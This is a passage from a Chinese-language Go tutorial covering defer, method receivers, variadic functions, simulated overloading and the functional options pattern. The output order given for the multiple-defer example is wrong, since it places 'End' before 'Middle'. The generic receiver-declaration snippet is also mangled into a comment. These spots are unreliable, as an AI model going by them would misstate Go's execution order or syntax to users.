punctuation\">)</span>\n    <span class=\"token comment\">// 可能引发 panic 的代码</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p><code>defer</code> 语句按照后进先出（LIFO）的顺序执行，即最后注册的函数最先执行。这使得 <code>defer</code> 在 Go 中成为一个强大而简洁的工具，用于确保资源管理和代码执行顺序的可靠性。</p>\n<p>以下是一个示例，展示了一个函数内有多个 <code>defer</code> 语句的情况：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"fmt\"</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Start\"</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">// 第一个 defer，注册的函数将在 main 函数执行结束后执行</span>\n    <span class=\"token keyword\">defer</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Deferred statement 1\"</span><span class=\"token punctuation\">)</span>\n \t\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Middle\"</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token comment\">// 第二个 defer</span>\n    <span class=\"token keyword\">defer</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Deferred statement 2\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"End\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在这个示例中，<code>main</code> 函数内有两个 <code>defer</code> 语句，它们分别注册了两个匿名函数。当 <code>main</code> 函数执行时，它们会按照 LIFO 的顺序执行。因此，输出顺序将是：</p>\n<ol>\n<li><code>Start</code></li>\n<li><code>End</code></li>\n<li><code>Middle</code></li>\n<li><code>Deferred statement 2</code></li>\n<li><code>Deferred statement 1</code></li>\n</ol>\n<h3>哪些函数可以defer</h3>\n<p>Go语言中除了有自定义的函数或方法，还有内置函数。下面是Go语言内置函数的完整列表：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>append cap close complex copy delete imag len\nmake new panic print println real recover\n</code></pre></div><p>内置函数是否都能作为deferred函数呢？</p>\n<p>append、cap、len、make、new等内置函数是不可以直接作为deferred函数的，而close、copy、delete、print、recover等可以。</p>\n<p>对于那些不能直接作为deferred函数的内置函数，我们可以使用一个包裹它的匿名函数来间接满足要求。以append为例：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">defer</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token boolean\">_</span> <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>sl<span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre></div><p>但这么做有什么实际意义需要开发者自己把握。</p>\n<h2>1.3. receiver参数</h2>\n<p>Go语言虽然不支持经典的面向对象语法元素，比如类、对象、继承等，Go语言中的方法在声明形式上仅仅多了一个参数，Go称之为receiver参数。receiver参数是方法与类型之间的纽带。Go方法的一般声明形式如下：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>receiver T<span class=\"token comment\">/*T) MethodName(参数列表) (返回值列表) {\n    // 方法体\n}\n</span></code></pre></div><p>上面方法声明中的T称为receiver的基类型。通过receiver，上述方法被绑定到类型T上。换句话说，上述方法是类型T的一个方法，我们可以通过类型T或*T的实例调用该方法，如下面的伪代码所示：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">var</span> t T\nt<span class=\"token punctuation\">.</span><span class=\"token function\">MethodName</span><span class=\"token punctuation\">(</span>参数列表<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">var</span> pt <span class=\"token operator\">*</span>T <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>t\npt<span class=\"token punctuation\">.</span><span class=\"token function\">MethodName</span><span class=\"token punctuation\">(</span>参数列表<span class=\"token punctuation\">)</span>\n</code></pre></div><p>Go方法具有如下特点。</p>\n<p>1）方法名的首字母是否大写决定了该方法是不是导出方法。</p>\n<p>2）方法定义要与类型定义放在同一个包内。由此我们可以推出：不能为原生类型（如int、float64、map等）添加方法，只能为自定义类型定义方法（示例代码如下）。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// 错误的做法</span>\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>i <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// 编译器错误：cannot define new methods on non- local type int</span>\n    <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 正确的做法</span>\n<span class=\"token keyword\">type</span> MyInt <span class=\"token builtin\">int</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>i MyInt<span class=\"token punctuation\">)</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>3）每个方法只能有一个receiver参数，不支持多receiver参数列表或变长receiver参数。一个方法只能绑定一个基类型，Go语言不支持同时绑定多个类型的方法。</p>\n<p>4）receiver参数的基类型本身不能是指针类型或接口类型，下面的示例展示了这点：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">type</span> MyInt <span class=\"token operator\">*</span><span class=\"token builtin\">int</span>\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>r MyInt<span class=\"token punctuation\">)</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// 编译器错误：invalid receiver type MyInt (MyInt  is a pointer type)</span>\n    <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">type</span> MyReader io<span class=\"token punctuation\">.</span>Reader\n<span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>r MyReader<span class=\"token punctuation\">)</span> <span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>p <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// 编译器错误：invalid receiver  type MyReader (MyReader is an  interface type)</span>\n    <span class=\"token keyword\">return</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h2>1.4. 变长参数函数</h2>\n<p>在Go语言中，可以使用变长参数函数（variadic functions）来处理可变数量的参数。变长参数函数可以接受任意数量的参数，这些参数被打包成一个切片（slice）传递给函数。这种特性非常有用，特别是当函数需要处理数量不确定的参数时。</p>\n<p>下面是一个简单的示例，展示了如何在Go语言中使用变长参数函数：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"fmt\"</span>\n\n<span class=\"token comment\">// 变长参数函数</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">sum</span><span class=\"token punctuation\">(</span>nums <span class=\"token operator\">...</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">{</span>\n    total <span class=\"token operator\">:=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> num <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> nums <span class=\"token punctuation\">{</span>\n        total <span class=\"token operator\">+=</span> num\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> total\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 调用变长参数函数</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">sum</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出: 6</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">sum</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出: 15</span>\n\n    <span class=\"token comment\">// 也可以传递切片作为参数</span>\n    numbers <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">}</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">sum</span><span class=\"token punctuation\">(</span>numbers<span class=\"token operator\">...</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出: 15</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在上面的示例中，sum函数是一个变长参数函数，它接受任意数量的int类型参数，并返回它们的总和。在main函数中，我们演示了如何调用sum函数并传递不同数量的参数或切片作为参数。</p>\n<p>关键点：</p>\n<p>在函数参数列表中，使用<code>...</code>语法指定一个参数是变长参数。\n变长参数在函数内部以切片的形式表示。\n可以传递不定数量的参数给变长参数函数。\n也可以传递切片给变长参数函数，使用<code>...</code>操作符来展开切片。</p>\n<p>使用变长参数函数时最容易出现的一个问题是实参与形参不匹配，比如下面这个例子：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// chapter4/sources/variadic_function_2.go</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>args <span class=\"token operator\">...</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> v <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> args <span class=\"token punctuation\">{</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    s <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"Tony\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"John\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Jim\"</span><span class=\"token punctuation\">}</span>\n    <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">...</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>运行这段代码：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>$ go run variadic_function_2.go\n./variadic_function_2.go:14:6: cannot use s (type []string) as type []interface {} in argument to dump\n</code></pre></div><p>我们看到，编译器给出了“类型不匹配”的错误。dump函数的变长参数类型为<code>...interface{}</code>，因此匹配该形参的要么是<code>interface{}</code>类型的变量，要么为<code>t...</code>（t类型为<code>[]interface{}</code>）。在例子中给dump传入的实参为<code>s...</code>，但s的类型为<code>[]string</code>，并非<code>[]interface{}</code>，导致不匹配。</p>\n<p>这里要注意的是，虽然<code>string</code>类型变量可以直接赋值给<code>interface{}</code>类型变量，但是<code>[]string</code>类型变量并不能直接赋值给<code>[]interface{}</code>类型变量。要消除编译错误，我们仅需将变量s的类型换为<code>[]interface{}</code>，见下面的代码：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    s <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"Tony\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"John\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Jim\"</span><span class=\"token punctuation\">}</span>\n    <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">...</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n$ <span class=\"token keyword\">go</span> run variadic_function_2<span class=\"token punctuation\">.</span><span class=\"token keyword\">go</span>\nTony\nJohn\nJim\n</code></pre></div><p>不过有个例外，那就是Go内置的append函数，它支持通过下面的方式将字符串附加到一个字节切片后面：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// chapter4/sources/variadic_function_3.go</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    b <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    b <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> <span class=\"token string\">\"hello\"</span><span class=\"token operator\">...</span><span class=\"token punctuation\">)</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">string</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n$ <span class=\"token keyword\">go</span> run variadic_function_3<span class=\"token punctuation\">.</span><span class=\"token keyword\">go</span>\nhello\n</code></pre></div><p>string类型本是不满足类型要求的（append本需要<code>[]byte...</code>），这算是Go编译器的一个优化，编译器自动将<code>string</code>隐式转换为了<code>[]byte</code>。</p>\n<h2>1.5. 模拟函数重载</h2>\n<p>在Go语言中并不支持像一些其他语言（如C++、Java）中那样的函数重载，也就是不能有多个同名函数但参数列表不同的情况。但是可以模拟函数重载的效果。</p>\n<ul>\n<li>\n<p>如果要重载的函数的参数都是相同类型的，仅参数的个数是变化的，那么变长参数函数可以轻松对应；</p>\n</li>\n<li>\n<p>如果参数类型不同且个数可变，那么我们还要结合<code>interface{}</code>类型的特性。一个例子：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\n<span class=\"token keyword\">func</span> <span class=\"token function\">concat</span><span class=\"token punctuation\">(</span>sep <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> args <span class=\"token operator\">...</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> result <span class=\"token builtin\">string</span>\n    <span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> v <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> args <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> i <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n            result <span class=\"token operator\">+=</span> sep\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">switch</span> v<span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">type</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">case</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int8</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int16</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int32</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int64</span><span class=\"token punctuation\">,</span>\n            <span class=\"token builtin\">uint</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint8</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint32</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">:</span>\n            result <span class=\"token operator\">+=</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">case</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">:</span>\n            result <span class=\"token operator\">+=</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">case</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">:</span>\n            ints <span class=\"token operator\">:=</span> v<span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> v <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> ints <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">if</span> i <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n                    result <span class=\"token operator\">+=</span> sep\n                <span class=\"token punctuation\">}</span>\n                result <span class=\"token operator\">+=</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">case</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">:</span>\n            strs <span class=\"token operator\">:=</span> v<span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span>\n            result <span class=\"token operator\">+=</span> strings<span class=\"token punctuation\">.</span><span class=\"token function\">Join</span><span class=\"token punctuation\">(</span>strs<span class=\"token punctuation\">,</span> sep<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span>\n            fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"the argument type [%T] is not supported\"</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token string\">\"\"</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> result\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"gopher\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token function\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">{</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"robot\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ai\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ml\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"hacker\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在上面这个例子中，我们定义了一个concat函数，该函数支持接受任意数量的整型、字符串、整型切片、字符串切片参数，并将输入的参数通过分隔符（sep）连接在一起。看main函数中对concat的调用，是不是有一种调用重载函数的感觉。</p>\n</li>\n</ul>\n<h2>1.6. 功能选项</h2>\n<p>在Go语言中，功能选项（Options）模式是一种常见的设计模式，用于在函数或方法中传递可变数量的配置选项。这种模式在标准库和许多第三方库中被广泛应用，可以使函数的参数更加灵活和可扩展。实现功能选项的一般方法：</p>\n<ul>\n<li>定义选项类型：通常是一个函数类型，它接受并修改某个配置选项。</li>\n<li>定义主要函数：主要函数接受一个或多个选项类型的参数，并根据这些选项进行操作。\n例子：</li>\n</ul>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"fmt\"</span>\n\n<span class=\"token comment\">// 选项类型</span>\n<span class=\"token keyword\">type</span> Options <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">{</span>\n    Option1 <span class=\"token builtin\">string</span>\n    Option2 <span class=\"token builtin\">int</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">type</span> Option <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>Options<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// 主要函数，接受选项参数</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">ProcessOptions</span><span class=\"token punctuation\">(</span>opts <span class=\"token operator\">...</span>Option<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    options <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>Options<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// 应用所有选项</span>\n    <span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> opt <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> opts <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">opt</span><span class=\"token punctuation\">(</span>options<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// 在这里使用选项进行操作</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Option1:\"</span><span class=\"token punctuation\">,</span> options<span class=\"token punctuation\">.</span>Option1<span class=\"token punctuation\">)</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Option2:\"</span><span class=\"token punctuation\">,</span> options<span class=\"token punctuation\">.</span>Option2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 选项函数，用于设置 Option1</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">WithOption1</span><span class=\"token punctuation\">(</span>val <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> Option <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">*</span>Options<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        o<span class=\"token punctuation\">.</span>Option1 <span class=\"token operator\">=</span> val\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 选项函数，用于设置 Option2</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">WithOption2</span><span class=\"token punctuation\">(</span>val <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> Option <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">*</span>Options<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        o<span class=\"token punctuation\">.</span>Option2 <span class=\"token operator\">=</span> val\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 使用功能选项模式调用函数</span>\n    <span class=\"token function\">ProcessOptions</span><span class=\"token punctuation\">(</span><span class=\"token function\">WithOption1</span><span 